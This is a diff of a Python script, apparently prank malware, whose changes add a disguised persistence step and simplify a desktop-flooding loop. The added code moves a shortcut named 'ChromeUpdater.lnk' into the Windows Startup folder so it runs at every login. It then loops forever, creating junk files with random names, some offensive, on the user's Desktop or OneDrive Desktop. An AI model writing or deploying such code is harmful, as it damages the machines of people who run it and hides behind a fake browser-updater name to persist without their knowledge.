@@ -1,35 +1,38 @@
 #Created by 2Loop & CaptainBeluga
 import random
 import os
-import time
+import winreg
 
-#already generated file 
-files = []
+def check_onedrive():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\OneDrive")
+        winreg.QueryValueEx(key, "UserFolder")[0]
+        return True
 
-desk = "C:\\Users\\%username%\\Desktop\\"
+    except:
+        return False
 
-extensions_list = ['pdf','txt','png','docx','xlsx','jpg','ini','pptx','dll','apk','mp4','zip','exe','mp3','dat','vbs','lnk','ogg','stl','fbx','iso','bat','cfg','md','dds','js','jpeg','png','html','css']
-names_list = ['astri', 'beluga', 'XDDDD', '6969', 'fucked', 'imagine', 'defalt','watch-dogs','fortnite','vbuck-kid','scammer','pwned']
+
+desk = ""
+if(check_onedrive()):
+    desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"
+
+else:
+    desk = "C:\\Users\\%username%\\Desktop\\"
+
+
+os.system('move "C:\\Users\\%username%\\AppData\\Local\\Programs\\ChromeUpdater\\ChromeUpdater.lnk" "C:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
+
+extensions_list = ['pdf','txt','png','docx','xlsx','jpg','ini','pptx','dll','apk','mp4','zip','exe','mp3','dat','vbs','stl','fbx','iso','bat','cfg','md','dds','js','jpeg','png','html','css']
+names_list = ['astri', 'beluga', 'XDDDD', '6969', 'fucked', 'imagine', 'defalt','watch-dogs','fortnite','vbuck-kid','scammer','pwned',"cript","notgaio","gayfriendly","hacked","bruh"]
 
 while True:
-
     #Generation process
-    name = random.choice(extensions_list)
-    extension = random.choice(names_list)
+    name = random.choice(names_list)
+    extension = random.choice(extensions_list)
 
-    result = f'{extension}.{name}'
+    result = f'{name}.{extension}'
 
-    #Checking if the file already exists
-    if(result not in files):
-        
-        try:
-            os.system(f"echo off > {desk}/{result}")
+    os.system(f"echo off > {desk}/{result}")
 
-        except Exception as e:
-            print(e)
-            desk = "C:\\Users\\%username%\\OneDrive\\Desktop\\"
-            os.system(f"echo off > {desk}/{result}")
-
-        files.append(result)
-
-        print(f'[+] File generated > {result}')
+    print(f'[+] File generated > {result}')
